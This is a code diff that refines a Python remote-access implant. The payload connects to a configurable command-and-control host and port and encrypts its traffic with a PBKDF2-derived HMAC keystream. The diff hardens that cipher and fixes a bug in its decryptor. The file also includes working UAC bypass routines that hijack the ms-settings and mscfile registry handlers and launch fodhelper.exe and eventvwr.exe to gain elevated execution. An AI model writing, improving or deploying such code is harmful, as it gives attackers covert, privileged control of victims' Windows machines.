@@ -22,17 +22,22 @@ def _uac_elevated_cmd():
             "import socket,base64,json,os,sys,struct,hashlib,hmac,time,threading,subprocess,platform\n"
             f"C2_HOST={C2_HOST!r};C2_PORT={C2_PORT}\n"
             f"ENCRYPTION_PASSWORD={ENCRYPTION_PASSWORD!r}\n"
-            f"RECONNECT_DELAY={RECONNECT_DELAY}\n\n"
-            "def _k(): return hashlib.pbkdf2_hmac('sha256',ENCRYPTION_PASSWORD.encode(),b'whisper_salt_2024',100000,32)\n"
+            f"RECONNECT_DELAY={RECONNECT_DELAY}\n"
+            "C2_SALT_HEX=''\n\n"
+            "def _k(): return hashlib.pbkdf2_hmac('sha256',ENCRYPTION_PASSWORD.encode(),_salt(),600000,32)\n"
+            "def _salt(): return bytes.fromhex(C2_SALT_HEX) if hasattr(C2_SALT_HEX,'__iter__') and C2_SALT_HEX else b'whisper_salt_2024'\n"
             "def _eb(p,k):\n"
             "    iv=os.urandom(16);ks=b'';c=0\n"
             "    while len(ks)<len(p):\n"
             "        ks+=hmac.new(k,iv+struct.pack('>Q',c),hashlib.sha256).digest();c+=1\n"
-            "    return iv+hmac.new(k,iv+bytes(x^y for x,y in zip(p,ks)),hashlib.sha256).digest()[:16]+bytes(x^y for x,y in zip(p,ks))\n"
+            "    ct=bytes(x^y for x,y in zip(p,ks))\n"
+            "    return b'\\x00'+iv+hmac.new(k,iv+ct,hashlib.sha256).digest()[:16]+ct\n"
             "def _db(d,k):\n"
+            "    if not d or d[0]!=0:raise ValueError('bad cipher')\n"
+            "    d=d[1:]\n"
             "    iv,tag,ct=d[:16],d[16:32],d[32:]\n"
             "    if not hmac.compare_digest(tag,hmac.new(k,iv+ct,hashlib.sha256).digest()[:16]):raise ValueError('integrity')\n"
-            "    ks,b''=b'',0\n"
+            "    ks,c=b'',0\n"
             "    while len(ks)<len(ct):\n"
             "        ks+=hmac.new(k,iv+struct.pack('>Q',c),hashlib.sha256).digest();c+=1\n"
             "    return bytes(x^y for x,y in zip(ct,ks))\n"
@@ -80,7 +85,7 @@ def _uac_fodhelper():
         with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as k:
             winreg.SetValueEx(k, "", 0, winreg.REG_SZ, cmd)
             winreg.SetValueEx(k, "DelegateExecute", 0, winreg.REG_SZ, "")
-        subprocess.Popen(["fodhelper.exe"], shell=True, close_fds=True)
+        subprocess.Popen(["fodhelper.exe"], close_fds=True)
         time.sleep(2)
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings", 0, winreg.KEY_WRITE) as k:
             winreg.DeleteKey(k, r"shell\open\command")
@@ -94,7 +99,7 @@ def _uac_eventvwr():
         key_path = r"Software\Classes\mscfile\shell\open\command"
         with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as k:
             winreg.SetValueEx(k, "", 0, winreg.REG_SZ, cmd)
-        subprocess.Popen(["eventvwr.exe"], shell=True, close_fds=True)
+        subprocess.Popen(["eventvwr.exe"], close_fds=True)
         time.sleep(2)
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\mscfile", 0, winreg.KEY_WRITE) as k:
             winreg.DeleteKey(k, r"shell\open\command")
